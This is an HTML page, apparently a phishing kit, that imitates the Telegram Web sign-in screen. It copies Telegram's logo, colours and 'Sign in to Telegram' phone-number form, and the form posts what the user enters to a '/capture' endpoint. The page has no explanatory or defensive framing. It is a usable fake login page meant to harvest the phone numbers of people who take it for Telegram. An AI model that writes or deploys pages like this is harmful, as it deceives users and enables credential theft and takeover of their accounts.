<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Web</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
        
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }
        
        body {
            background: #212121;
            min-height: 100vh;
            display: flex;
        }
        
        .sidebar {
            width: 420px;
            background: #17212b;
            border-right: 1px solid #242f3d;
            display: flex;
            flex-direction: column;
        }
        
        .header {
            background: #17212b;
            padding: 15px 20px;
            display: flex;
            align-items: center;
            gap: 20px;
            border-bottom: 1px solid #242f3d;
        }
        
        .menu-btn {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            font-size: 20px;
        }
        
        .search-box { color: #fff; font-size: 18px; font-weight: 500; flex: 1; }
        
        .auth-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 40px;
            text-align: center;
        }
        
        .phone-icon {
            width: 120px;
            height: 120px;
            background: linear-gradient(135deg, #2aabee, #229ed9);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 30px;
        }
        .phone-icon svg { width: 60px; height: 60px; fill: white; }
        
        h1 {
            color: #fff;
            font-size: 24px;
            font-weight: 500;
            margin-bottom: 20px;
        }
        
        .subtitle {
            color: #8e9297;
            font-size: 15px;
            margin-bottom: 30px;
            line-height: 1.5;
        }
        
        .phone-form {
            width: 100%;
            max-width: 300px;
        }
        
        .country-select {
            background: #242f3d;
            border: none;
            border-radius: 10px;
            padding: 15px;
            color: #fff;
            font-size: 16px;
            width: 100%;
            margin-bottom: 15px;
            cursor: pointer;
        }
        
        .phone-input {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        .country-code {
            background: #242f3d;
            border: none;
            border-radius: 10px;
            padding: 15px;
            color: #fff;
            width: 80px;
            font-size: 16px;
        }
        
        .phone-number {
            flex: 1;
            background: #242f3d;
            border: none;
            border-radius: 10px;
            padding: 15px;
            color: #fff;
            font-size: 16px;
        }
        input:focus { outline: 2px solid #2aabee; }
        input::placeholder { color: #8e9297; }
        
        .btn-next {
            width: 100%;
            background: #2aabee;
            color: #fff;
            border: none;
            border-radius: 10px;
            padding: 15px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
        }
        .btn-next:hover { background: #229ed9; }
        
        .qr-option {
            margin-top: 30px;
            color: #8e9297;
            font-size: 14px;
        }
        .qr-option a {
            color: #2aabee;
            text-decoration: none;
        }
        .qr-option a:hover { text-decoration: underline; }
        
        .logo-text {
            position: absolute;
            bottom: 40px;
            left: 40px;
            display: flex;
            align-items: center;
            gap: 10px;
            color: #fff;
            font-size: 20px;
            font-weight: 700;
        }
        .logo-text svg { width: 30px; height: 30px; fill: #2aabee; }
    </style>
</head>
<body>
    <div class="sidebar">
        <div class="header">
            <div class="menu-btn">☰</div>
            <div class="search-box">Telegram</div>
        </div>
        
        <div class="auth-content">
            <div class="phone-icon">
                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
            </div>
            
            <h1>Sign in to Telegram</h1>
            <p class="subtitle">Please confirm your country and enter your phone number.</p>
            
            <form class="phone-form" action="/capture" method="POST">
                <select class="country-select">
                    <option>🇮🇳 India</option>
                    <option>🇺🇸 United States</option>
                    <option>🇬🇧 United Kingdom</option>
                </select>
                
                <div class="phone-input">
                    <input type="text" class="country-code" value="+91" readonly>
                    <input type="tel" class="phone-number" name="phone" placeholder="Phone number" required>
                </div>
                
                <button type="submit" class="btn-next">Next</button>
            </form>
            
            <div class="qr-option">
                Or <a href="#">log in by scanning QR code</a>
            </div>
        </div>
        
        <div class="logo-text">
            <svg viewBox="0 0 24 24"><path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/></svg>
            Telegram
        </div>
    </div>
</body>
</html>
